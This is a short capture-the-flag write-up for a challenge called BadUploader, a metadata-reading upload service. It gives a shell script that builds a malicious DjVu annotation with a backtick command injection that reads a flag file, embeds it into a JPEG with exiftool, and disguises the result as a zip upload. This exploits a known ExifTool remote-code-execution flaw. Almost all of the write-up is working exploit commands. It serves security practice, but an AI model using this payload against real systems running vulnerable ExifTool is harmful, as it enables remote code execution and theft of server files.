## BadUploader (200 points)

#### Solved by hieplpvip

```
Bad Uploader

My web app helps you know about file metadata.

Give me a zip file, I will tell you all about it, including the flag in /etc/flag.txt

61.28.237.24:30110/uploader

Author: sonnguy3n
```

```shell
wget -qO sample.jpg placekitten.com/200
file sample.jpg
printf 'P1 1 1 1' > input.pbm
cjb2 input.pbm mask.djvu
djvumake exploit.djvu Sjbz=mask.djvu
echo -e '(metadata (copyright "\\\n" . `cat /tmp/flag.txt` #"))' > input.txt
djvumake exploit.djvu Sjbz=mask.djvu ANTa=input.txt
exiftool '-GeoTiffAsciiParams<=exploit.djvu' sample.jpg
perl -0777 -pe 's/\x87\xb1/\xc5\x1b/g' < sample.jpg > exploit.jpg
mv exploit.jpg exploit.zip
```

**Flag:** `HCMUS-CTF{CVE_22204_1s_v3ry_1nt3r3st1ng}`

### References

- [https://amalmurali47.medium.com/an-image-speaks-a-thousand-rces-the-tale-of-reversing-an-exiftool-cve-585f4f040850](https://amalmurali47.medium.com/an-image-speaks-a-thousand-rces-the-tale-of-reversing-an-exiftool-cve-585f4f040850)
